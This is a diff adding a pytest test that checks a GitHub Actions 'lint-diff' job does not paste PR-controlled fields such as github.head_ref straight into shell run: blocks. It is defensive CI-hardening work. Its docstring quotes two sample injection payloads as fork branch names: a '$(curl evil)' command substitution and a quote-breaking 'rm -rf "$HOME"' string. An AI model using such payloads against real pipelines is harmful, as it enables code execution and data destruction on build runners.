@@ -113,3 +113,74 @@ class TestLintWorkflow:
             pytest.fail(f"lint.yml is not valid YAML: {exc}")
         assert isinstance(parsed, dict)
         assert "jobs" in parsed
+
+    def test_lint_diff_run_blocks_avoid_untrusted_interpolation(self):
+        """No ``run:`` block in the ``lint-diff`` job may interpolate
+        PR-derived fields directly via ``${{ github.head_ref }}``,
+        ``${{ github.base_ref }}``, ``${{ github.ref_name }}``, or
+        ``${{ github.event.pull_request.* / issue.* / comment.* }}``.
+
+        Expression interpolation happens *before* bash sees the script,
+        so a fork branch name like ``$(curl evil)`` or
+        ``"; rm -rf "$HOME"; echo "`` breaks out of the surrounding
+        quotes when pasted in. The safe pattern is to bind the value to
+        a step-level ``env:`` variable and reference it via
+        ``"$VAR"`` from the shell — see the ``Determine base ref`` and
+        ``Generate diff summary`` steps for the worked example.
+
+        Scoped to the ``lint-diff`` job: ``ruff-blocking`` and
+        ``windows-footguns`` do not read PR-controlled fields. A
+        repo-wide invariant test (applied across every workflow) is
+        deliberately deferred to a future PR to keep this change
+        narrow.
+        """
+        import re
+        import yaml
+
+        content = self.WORKFLOW_PATH.read_text(encoding="utf-8")
+        parsed = yaml.safe_load(content)
+        lint_diff = parsed.get("jobs", {}).get("lint-diff")
+        assert lint_diff is not None, (
+            "lint.yml no longer defines a ``lint-diff`` job; if the "
+            "job was renamed, update this test (and the plan referenced "
+            "above) to point at the new name."
+        )
+
+        # Match the forbidden field names anywhere inside a ``run:``
+        # string — they may sit inside a ternary
+        # (``${{ X && github.head_ref || github.ref_name }}``) rather
+        # than at the start of the expression.  The hardened workflow
+        # binds these to ``env:`` mappings, so they should never appear
+        # in a ``run:`` block at all.
+        forbidden = re.compile(
+            r"github\.("
+            r"head_ref"
+            r"|base_ref"
+            r"|ref_name"
+            r"|event\.(pull_request|issue|comment)\."
+            r")"
+        )
+
+        offenders = []
+        for step in lint_diff.get("steps", []) or []:
+            run = step.get("run")
+            if not isinstance(run, str):
+                continue
+            for match in forbidden.finditer(run):
+                offenders.append(
+                    (step.get("name", "<unnamed step>"), match.group(0))
+                )
+
+        assert not offenders, (
+            "lint-diff job has ``run:`` block(s) interpolating PR-derived "
+            "fields directly:\n"
+            + "\n".join(
+                f"  step={name!r} expression={expr!r}"
+                for name, expr in offenders
+            )
+            + "\n\nMove the expression into a step-level ``env:`` mapping "
+            "and reference the bound variable via ``\"$VAR\"`` in the "
+            "shell. PR branch names can contain ``$()``, backticks, and "
+            "``\"``-terminated payloads; expression interpolation pastes "
+            "those characters into the script before bash parses it."
+        )
